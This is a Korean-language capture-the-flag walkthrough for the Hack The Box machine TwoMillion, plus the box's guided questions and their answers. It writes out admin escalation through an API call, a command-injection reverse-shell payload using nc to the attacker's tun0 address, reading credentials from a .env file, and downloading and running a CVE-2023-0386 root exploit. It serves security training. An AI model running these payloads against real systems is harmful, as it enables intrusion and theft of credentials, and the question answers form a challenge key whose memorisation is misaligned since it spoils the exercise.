@@ -1,0 +1,177 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. 웹 접속 및 경로 이동
+http://htb_ip/invite
+
+
+3. 개발자모드로 초대코드 획득
+makeInviteCode() 입력
+나온 결과 디코딩
+
+
+4. 디코딩으로 얻은 경로로 터미널에 요청
+curl -X POST http://htb_ip/api/v1/invite/generate
+결과 디코딩 후 회원가입 및 로그인
+http://htb_ip/api/v1
+로 다른 경로 확인가능
+
+
+5. admin 권한 상승 
+curl -X PUT http://htb_ip/api/v1/admin/settings/update \
+  -b "PHPSESSID=세션" \
+  -H "Content-Type: application/json" \
+  --data '{"email":"본인이메일","is_admin":1}'
+
+사용자 권한 획득
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -b "PHPSESSID=세션" \
+  -H "Content-Type: application/json" \
+  --data '{"username": "test;id #"}'
+
+
+6. 리버스 쉘 접속
+다른 터미널에 nc -lvnp 4444 입력 후
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -b "PHPSESSID=세션" \
+  -H "Content-Type: application/json" \
+  --data '{"username": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0_IP 4444 >/tmp/f #"}'
+
+쉘 접속 후 쉘 안정화
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+7. 유저 플래그 찾기
+find / -name "user.txt" 2>/dev/null
+cat /home/{유저}/user.txt
+권한 부족으로 .evn 파일 확인
+cat /var/www/html/.env
+
+
+8. SSH 접속
+ssh admin@htb_ip
+비밀번호는 .evn파일에 있음
+
+
+9. 다시 유저 플래그 확인
+cat /home/admin/user.txt
+
+
+10. 루트 플래그 찾기
+다른 터미널에서
+cd /tmp
+git clone https://github.com/Fanxiaoyao66/CVE-2023-0386
+cd CVE-2023-0386
+
+서버 실행
+cd /tmp/CVE-2023-0386
+python3 -m http.server 8000
+
+
+11. 파일 전송
+ssh 접속한 터미널에서
+cd /tmp
+mkdir cve && cd cve
+wget http://tun0_IP:8000/fuse.c
+wget http://tun0_IP:8000/exp.sh
+chmod +x exp.sh
+bash exp.sh
+파일 다운 및 권한 상승
+
+
+12. 루트 플래그 확인
+cat /root/root.txt
+
+
+-------------------------------
+
+
+1. How many TCP ports are open?
+열려 있는 TCP 포트는 몇 개입니까?
+
+> 2
+
+
+2. What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?
+/invite초대 코드와 관련된 페이지 에서 로드되는 자바스크립트 파일의 이름은 무엇입니까 ?
+
+> inviteapi.min.js
+
+
+3. What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.
+초대 페이지에서 초대 코드를 얻는 방법에 대한 첫 번째 힌트를 반환하는 JavaScript 함수는 무엇입니까? 답변에 ​​괄호 ()를 포함하지 마세요.
+
+> makeInviteCode
+
+
+4. The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?
+해당 엔드포인트는 makeInviteCode암호화된 데이터를 반환합니다. 이 메시지는 쿼리할 수 있는 다른 엔드포인트를 제공합니다. 이 엔드포인트는 code매우 일반적인 이진-텍스트 인코딩 형식으로 인코딩된 값을 반환합니다. 이 인코딩 형식의 이름은 무엇입니까?
+
+> base64
+
+
+5. What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?
+사용자가 "연결 팩"을 클릭했을 때 페이지에서 사용하는 엔드포인트의 경로는 무엇입니까?
+
+> /api/v1/user/vpn/generate
+
+
+6. How many API endpoints are there under /api/v1/admin?
+해당 하위에는 몇 개의 API 엔드포인트가 있습니까 /api/v1/admin?
+
+> 3
+
+
+7. What API endpoint can change a user account to an admin account?
+사용자 계정을 관리자 계정으로 변경할 수 있는 API 엔드포인트는 무엇입니까?
+
+> /api/v1/admin/settings/update
+
+
+8. What API endpoint has a command injection vulnerability in it?
+어떤 API 엔드포인트에 명령 주입 취약점이 있습니까?
+
+> /api/v1/admin/vpn/generate
+
+
+9. What file is commonly used in PHP applications to store environment variable values?
+PHP 애플리케이션에서 환경 변수 값을 저장하는 데 일반적으로 사용되는 파일은 무엇입니까?
+
+> .env
+
+
+10. X
+
+
+11. What is the email address of the sender of the email sent to admin?
+관리자에게 보낸 이메일의 발신자 이메일 주소는 무엇입니까?
+
+> ch4p@2million.htb
+
+
+12. What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?
+Overlay 파일 시스템에서 공격자가 소유자 및 SetUID 비트와 같은 메타데이터를 유지하면서 파일을 이동할 수 있도록 허용하는 취약점의 2023년 CVE ID는 무엇입니까?
+
+> CVE-2023-0386
+
+
+13. X
+
+
+14. [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?
+[대체 권한으로 Esc 키를 누르세요] TwoMillion에 설치된 GLIBC 라이브러리의 버전은 무엇인가요?
+
+> 2.35
+
+
+15. [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?
+[대체 권한 탈출] GNU C 동적 로더의 2023년 버퍼 오버플로 취약점에 대한 CVE ID는 무엇입니까?
+
+> CVE-2023-4911
+
+
+16. [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.
+[대체 권한 획득 방법] 관리자 또는 www-data 권한으로 셸을 열고 Looney Tunables의 POC를 찾아보세요. 버퍼 오버플로를 유발하는 환경 변수의 이름은 무엇입니까? 이 질문에 답한 후, POC를 실행하고 루트 권한으로 셸을 얻으세요.
+
+>GLIBC_TUNABLES
